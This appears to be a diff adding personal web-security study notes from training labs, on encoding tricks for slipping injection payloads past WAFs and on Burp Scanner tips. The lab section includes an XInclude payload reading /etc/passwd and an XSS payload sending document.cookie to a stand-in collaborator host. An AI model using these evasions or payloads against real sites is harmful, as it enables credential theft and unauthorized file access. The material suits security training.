@@ -1,0 +1,134 @@
+Essential skills
+- In practice, important to recognize bugs and know how to adapt techniques you've learned
+- Some broadly applicable skills to apply learned to live targets
+- Cover general tips and tricks
+- How to use some Burp's lesser-known features to optimize workflow
+
+
+Obfuscating attacks using encodings
+- Copy attack from solution and attemp on real sites will only get you so far
+- Real web often audited by other users and had a number of patches
+
+- Context-specific decoding:
+    + Use encoding to pass data between systems -> when wan to use, have to decode first
+    + Example: A query param is URL decoded server-side, text content maybe client-side
+    + Should know where exactly payload is being injected, how it is decoded, can find another way to represent the same payload
+
+Decoding discrepancies:
+- Injection attack often involve that use recognizable pattern, such as HTML tags, JS functions, SQL statement. Input payload never expected to contain user-supplied code or markup
+- From security perpective, decoding performed when checking input is same as decoding performed by BE server when it uses the data
+- Any discrepancy can enable attacker sneak harmful payload past the filter apply different encoding that will automatically be removed later
+
+Obfuscation via URL encoding:
+- Example:
+    ?search=Fish & Chips
+    ?search=Fish+%26+Chips
+- Note: Space can be encoded as %20 or adding + instead
+- Url based input decoded server-side before it assigned to relevant var -> inject encoded data, it will decode in the BE
+- Sometimes, may find some WAFs fail to properly URL decode input when checking. This case, able to smuggle payload to BE by encoding any character, keywork in blacklisted
+
+Obfuscation via double URL encoding:
+- Example:
+    /?search=<img src=x onerror=alert(1)>
+    /?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+    /?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+
+Obfuscation via HTML encoding:
+- Example:
+    <img src=x onerror="&#x61;lert(1)">
+- In specific location in HTML, text content of element or value of attribute, browser auto decode these when parse document
+- Leading zeros:
+    + When using decimal or hex-style HTML encoding, can optionally include arbitrary number of leading zeros in code points. Some WAF and other input filter fail to adequately account for this
+    + Example:
+        <a href="javascript:alert(1)">Click me</a>
+        <a href="javascript&#00000000000058;alert(1)">Click me</a>
+
+Obfuscation via XML encoding:
+- XML also support character encoding using the same numeric escape sequences as HTML
+- The different is that payload is decoded by server itself, rather than client-side
+- Useful for bypass WAF and other filter, by encode can advoid detect by SQL injection
+- Example:
+    SELECT
+    &#x53;ELECT
+
+Obfuscation via unicode escaping:
+- Unicode escape sequences: prefix \u follow by 4 digit hex code for character
+- Example:
+    eval("alert(1)")
+    eval("\u0061lert(1)")
+- \u003a represents a colon, ES6 also support unicode escape using curly braces \u{3a}
+- When parsing string, most programming languages decode these unicode escapes (include JS engine used by browser)
+- Note:
+    + Inside string can escape any character
+    + However, outside string escape some character will result in syntax error
+- ES6-stype also allow optional leading zeros, some WAF may be fooled using same technique used for HTML encoding
+    + Example:
+        <a href="javascript:alert(1)">Click me</a>
+        <a href="javascript:\u{00000000061}lert(1)">Click me</a>
+
+Obfuscation via hex escaping:
+- Hex escape prefix with \x
+- Example:
+    \x61 -> a
+    eval("\x61lert")
+    0x53454c454354 -> SELECT
+
+Obfuscation via octal escaping:
+- Prefix with \
+- Example:
+    \141 -> a
+    eval("\141lert(1)")
+
+Obfuscation via multiple encodings:
+- Example:
+    <a href="javascript:&bsol;u0061lert(1)">Click me</a>
+    &bsol;u0061 -> \u0061 -> a
+
+Obfuscation via the SQL CHAR() function:
+- Not stricly a form of encoding, but may be able to obfuscate SQL injection using CHAR() function
+- CHAR(): accept a single decimal or hex code point, return matching character
+- Example:
+    CHAR(83) -> s
+    CHAR(0x53) -> s
+    CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) -> SELECT
+
+
+------------------ Burp Scanner during manual testing --------------------
+
+Scan tip:
+- Do active scan: HTTP history tab, scan from single request
+- Scan selected insertion point: Repeater tab, hightlight insertion point
+- Scan defined insertion points: Intruder tab, select multiple point 
+
+Scanning a specific request: (1)
+- May not catch every last vuln, but could flag thing in second that could otherwise have taken hours to find
+
+Scanning custom insertion points:
+- Can scan only 1 param in request using Scan selected insertion point
+- You can also custom your payload you want to test by extension Scan manual insertion point
+    + https://portswigger.net/bappstore/ca7ee4e746b54514a0ca5059329e926f
+
+Scanning non-standard data structures: (3)
+- Can target a specific substring value, useful for non-standard data structures
+    + Like JSON, XML format (can place payload at specific position without breaking structure)
+- Scan selected insertion point or Scan defined insertion points in Intruder tab
+
+
+------------------- Lab -------------------
+
+01_Discovering_vulnerabilities_quickly_with_targeted_scanning
+- If you using burp scan, you will see it warning about XML injection and Out-of-band
+- But not necessary for out-of-band, just trigger error and it will throw all sensitive information
+    + Need to use internal file build for XML to call this
+    + Read about XInclude attacks in XXE topic for more information
+- Payload:
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+02_Scanning_non_standard_data_structures
+- Notice the session cookie after login
+    + Format: username:session_id
+- If you use burp scan the username only, will have the stored XSS warning
+    + Combine with burp collaborator to get the admin cookies 
+- Payload:
+    '"><svg/onload=fetch(`//{burp_domain}/?${{encodeURIComponent(document.cookie)}}`)>
